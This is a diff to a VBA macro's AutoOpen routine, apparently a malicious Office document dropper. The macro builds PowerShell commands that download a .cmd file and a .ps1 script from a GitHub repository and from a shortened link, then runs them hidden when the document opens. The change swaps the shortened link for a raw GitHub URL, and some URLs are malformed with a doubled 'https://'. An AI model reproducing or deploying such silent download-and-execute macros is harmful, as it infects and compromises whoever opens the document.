@@ -32,7 +32,7 @@ Sub AutoOpen()
 
     ' Construct the PowerShell commands to download the files (Script 2's approach but with Script 1's robustness)
     shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'https://https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/l3.cmd' -OutFile '" & initialCmdPath & "'"""
-    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://tinyulr.com/4vte2rpj' -OutFile '" & extractPs1Path & "'"""
+    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/Extract.ps1' -OutFile '" & extractPs1Path & "'"""
 
     ' Execute the PowerShell commands to download the files
     Shell shellCmdInitial, vbHide
